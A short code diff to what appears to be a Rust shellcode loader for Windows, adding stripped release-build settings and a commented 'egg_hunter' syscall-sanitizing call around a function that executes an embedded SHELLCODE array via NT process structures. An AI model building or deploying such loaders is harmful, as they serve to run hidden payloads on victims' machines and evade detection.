@@ -23,6 +23,14 @@
             "Win32_Foundation",
         ]}
 
+    Recommended release profile in Cargo.toml:
+        [profile.release]
+        strip = true
+        lto = true
+        codegen-units = 1
+        panic = "abort"
+        overflow-checks = false
+
     Compile on linux using:
         cargo build --release --target x86_64-pc-windows-gnu
 */
@@ -70,6 +78,9 @@ const SHELLCODE: &[u8] = &[
 
 unsafe fn execute(name: &str) -> i32 {
     unsafe {
+    // Uncomment the following line when using egg_hunter method:
+    // spt_sanitize_syscalls();
+
     let mut oa: OBJECT_ATTRIBUTES = zeroed();
     let mut cid: CLIENT_ID = zeroed();
     let mut s_handle: HANDLE = ptr::null_mut();
